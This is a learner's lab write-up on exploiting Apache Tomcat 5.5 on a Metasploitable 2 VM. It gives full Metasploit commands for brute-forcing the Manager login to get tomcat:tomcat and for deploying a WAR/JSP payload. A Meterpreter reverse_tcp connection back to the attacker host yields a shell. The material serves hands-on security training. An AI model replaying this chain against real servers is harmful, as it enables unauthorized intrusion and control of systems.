# Metasploitable 2 – Apache Tomcat 5.5 Exploitation

**Date:** 7 September 2026  
**Lab:** Metasploitable 2  
**Target:** `192.168.29.48:8180`  
**Kali:** `192.168.29.168`

## 1. Goal

Investigate Apache Tomcat 5.5 on port 8180 and use Metasploit to obtain remote code execution while understanding each step.

Attack flow:

`Enumeration → Manager authentication → Credential discovery → WAR deployment → JSP execution → Meterpreter → Linux shell`

## 2. Initial Enumeration

Nmap had identified:

```text
8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1
```

The Tomcat web page was checked with:

```bash
curl -i http://192.168.29.48:8180
```

It returned:

```text
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
```

The page title identified:

```text
Apache Tomcat/5.5
```

Useful paths discovered included:

```text
/manager/status
/admin
/manager/html
/RELEASE-NOTES.txt
/tomcat-docs/
/jsp-examples/
/servlets-examples/
/webdav/
```

The page also indicated that Tomcat users are defined in:

```text
$CATALINA_HOME/conf/tomcat-users.xml
```

## 3. Test Tomcat Manager

I checked the Manager application:

```bash
curl -i http://192.168.29.48:8180/manager/html
```

Result:

```text
HTTP/1.1 401 Unauthorized
Server: Apache-Coyote/1.1
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

This meant the Manager was reachable but required HTTP Basic Authentication.

## 4. Search Metasploit

Started Metasploit:

```bash
msfconsole
```

Then:

```text
search tomcat
```

Important modules found included:

```text
exploit/multi/http/tomcat_mgr_deploy
exploit/multi/http/tomcat_mgr_upload
auxiliary/scanner/http/tomcat_mgr_login
```

I learned that `auxiliary` modules are used for supporting tasks such as scanning and credential testing, while `exploit` modules perform exploitation.

## 5. Inspect the Manager Exploit

Selected:

```text
use exploit/multi/http/tomcat_mgr_deploy
```

Checked:

```text
show options
```

The module initially had:

```text
RPORT 80
```

But the actual Tomcat service was on:

```text
8180
```

The payload was:

```text
java/meterpreter/reverse_tcp
```

with:

```text
LHOST 192.168.29.168
LPORT 4444
```

I did not exploit yet because the Manager required authentication.

## 6. Use the Tomcat Manager Login Scanner

Returned:

```text
back
```

Selected:

```text
use auxiliary/scanner/http/tomcat_mgr_login
```

Checked:

```text
show options
```

The scanner initially used:

```text
RPORT 8080
```

So I corrected it:

```text
set RHOSTS 192.168.29.48
set RPORT 8180
```

The Manager path was already:

```text
/manager/html
```

Verified with:

```text
show options
```

## 7. Find Valid Credentials

Ran:

```text
run
```

The scanner tested multiple Tomcat Manager username/password combinations.

Most failed, but one succeeded:

```text
[+] 192.168.29.48:8180 - Login Successful: tomcat:tomcat
```

Credentials discovered:

```text
Username: tomcat
Password: tomcat
```

## 8. Configure the Exploit

Returned:

```text
back
```

Selected:

```text
use exploit/multi/http/tomcat_mgr_deploy
```

Configured the target:

```text
set RHOSTS 192.168.29.48
set RPORT 8180
```

Configured the discovered credentials:

```text
set HttpUsername tomcat
set HttpPassword tomcat
```

Checked:

```text
show options
```

Important final settings:

```text
HttpUsername  tomcat
HttpPassword  tomcat
PATH          /manager
RHOSTS        192.168.29.48
RPORT         8180
SSL           false
```

Payload:

```text
java/meterpreter/reverse_tcp
```

Listener:

```text
LHOST 192.168.29.168
LPORT 4444
```

## 9. Exploit

Ran:

```text
run
```

Metasploit automatically selected:

```text
Linux x86
```

It then uploaded a WAR file:

```text
[*] Uploading 6225 bytes as G6Eq5oK0MowzunBqlAe5P.war ...
```

Then executed a JSP:

```text
[*] Executing /G6Eq5oK0MowzunBqlAe5P/GbrckxNRH.jsp...
```

The temporary application was removed:

```text
[*] Undeploying G6Eq5oK0MowzunBqlAe5P ...
```

Finally:

```text
[*] Sending stage (58073 bytes) to 192.168.29.48
[*] Meterpreter session 1 opened
```

The exploit was successful.

## 10. Meterpreter Session

I received:

```text
meterpreter >
```

I first tried:

```text
whoami
```

but got:

```text
[-] Unknown command: whoami.
```

### Why?

`whoami` is a Linux shell command, not a native Meterpreter command.

I entered the Linux shell with:

```text
shell
```

Metasploit returned:

```text
Process 1 created.
Channel 1 created.
```

## 11. Verify the Compromised Account

Inside the Linux shell:

```bash
whoami
```

Result:

```text
tomcat55
```

So the exploit gave me code execution as the Tomcat service account.

It did **not** immediately give root.

I also ran:

```bash
ls
```

and saw the target filesystem:

```text
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
```

This confirmed shell access to the Metasploitable 2 filesystem.

## 12. What Happened Technically?

The high-level chain was:

```text
Apache Tomcat 5.5
        ↓
Tomcat Manager discovered
        ↓
Manager returned 401
        ↓
Credential scanner
        ↓
tomcat:tomcat discovered
        ↓
Authenticated Manager access
        ↓
WAR application uploaded
        ↓
JSP executed
        ↓
Reverse TCP connection
        ↓
Meterpreter session
        ↓
Linux shell
        ↓
tomcat55
```

The Tomcat Manager provides application deployment functionality. With valid Manager credentials, the Metasploit module used that deployment capability to upload a WAR application containing a JSP payload and execute it.

## 13. Mistakes and Lessons

### Mistake 1 — Wrong RPORT

The exploit module defaulted to:

```text
RPORT 80
```

The login scanner defaulted to:

```text
RPORT 8080
```

But the actual service was:

```text
8180
```

Corrected with:

```text
set RPORT 8180
```

**Lesson:** Always compare module defaults with the service/port discovered during enumeration.

### Mistake 2 — `whoami` inside Meterpreter

I entered:

```text
meterpreter > whoami
```

This failed because Meterpreter has its own command set.

Correct approach:

```text
shell
```

then:

```bash
whoami
```

### Mistake 3 — Assuming successful exploitation means root

The exploit succeeded, but:

```bash
whoami
```

returned:

```text
tomcat55
```

Therefore, the result was remote code execution as the Tomcat service account, not root.

**Lesson:** Always verify privileges after obtaining a session.

## 14. Commands Used

### Enumeration

```bash
curl -i http://192.168.29.48:8180
curl -i http://192.168.29.48:8180/manager/html
```

### Search

```text
msfconsole
search tomcat
```

### Credential scanner

```text
use auxiliary/scanner/http/tomcat_mgr_login
show options
set RHOSTS 192.168.29.48
set RPORT 8180
show options
run
```

### Exploit

```text
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.29.48
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
show options
run
```

### Session

```text
shell
```

Linux:

```bash
whoami
ls
```

## 15. Final Result

Apache Tomcat 5.5 on:

```text
192.168.29.48:8180
```

was successfully exploited through the Tomcat Manager application.

Valid credentials:

```text
tomcat:tomcat
```

were discovered and used to authenticate to Manager.

Metasploit then deployed a WAR/JSP payload and obtained a Meterpreter session.

Final confirmed account:

```text
tomcat55
```

### Final access

```text
Tomcat Manager
      ↓
Authenticated deployment
      ↓
Remote Code Execution
      ↓
Meterpreter
      ↓
Linux shell
      ↓
tomcat55
```

**Root access was not obtained during this exploitation step.**
